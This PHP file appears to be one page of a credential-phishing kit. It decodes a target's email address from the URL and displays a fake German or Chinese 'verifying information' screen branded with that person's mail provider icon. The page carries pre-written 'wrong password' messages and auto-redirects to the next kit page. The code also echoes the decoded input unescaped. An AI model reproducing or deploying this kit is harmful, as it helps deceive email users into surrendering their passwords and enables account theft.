<?php
error_reporting(E_ALL ^ E_NOTICE);  
$mail = $_GET['0'];
$dec = base64_decode($mail);
$domain = $dec;
if (stripos($domain, '.de') !== false || stripos($domain, '.at') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '.ch') !== false || stripos($domain, '.com') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '.eu') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '.net') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '126') !== false){
$serv = "serv/hm.ico";
}


elseif (stripos($domain, '@mail.com') !== false){
$serv = "serv/ma.ico";
	
}

elseif (stripos($domain, 'gmail.com') !== false){
$serv = "serv/gm.ico";
}

elseif (stripos($domain, 'qq') !== false){
$serv = "serv/qq.ico";
	
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){	
$serv = "serv/hm.ico";
	
}

else{
$serv = "http://".$fav."/favicon.ico";
	
}
/**--------------------------------------------------------------**/
if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "完成电子邮件更新";
$wrong = "服务器响应：密码错误";
$update = "更新...";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Verifizieren von Informationen";
$wrong = "Falsches Passwort: Noch eine Testversion übrig";
$update = "Authentifizierung......";
}
?>
<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Verifizieren von Informationen...</title>
		<link rel="stylesheet" href="cache/css.css">
		<meta http-equiv="refresh" content="4; URL='ld.php?0=<?php echo $mail; ?>'" />
    <script src="cache/js.js" defer></script>
		<link rel="stylesheet" href="cache/style2.css">
	</head>
	<body>
		<div class="loginBox">
			<img src="<?php echo $serv; ?>" class="user">
			<h2><?php echo $header;?></h2>
			<form action="#">

				<input type="text" readonly name="e" placeholder="" value="<?php echo $dec; ?>">

				    <div class="progress-bar" style="--width: 10" data-label="<?php echo $update; ?>"></div>
				
			</form>
		</div>
	</body>
</html>
